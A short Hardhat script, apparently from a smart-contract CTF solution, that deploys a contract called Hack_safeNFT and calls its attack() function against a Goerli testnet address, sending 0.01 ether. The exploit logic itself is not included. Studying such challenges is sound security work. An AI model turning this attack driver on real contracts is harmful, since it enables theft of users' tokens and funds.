const { ethers } = require('hardhat');

async function main() {
  let target = '0xf0337Cde99638F8087c670c80a57d470134C3AAE'; //Goerli Test Net
  const account = await ethers.getSigner();
  const provider = new ethers.providers.JsonRpcProvider(process.env.PROVIDER);

  const Hack_safeNFT = await ethers.getContractFactory('Hack_safeNFT');

  console.log('Deploying hack_safeNFT contract');
  const hack_safeNFT = await Hack_safeNFT.connect(account).deploy();
  await hack_safeNFT.deployed();

  const hackSigner = new ethers.Contract(
    hack_safeNFT.address,
    hack_safeNFT.interface,
    provider,
  );

  console.log(hack_safeNFT.address);
  console.log('Lets attack , LFG...........');

  await hackSigner
    .connect(account)
    .attack(target, { value: ethers.utils.parseEther('0.01') });
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
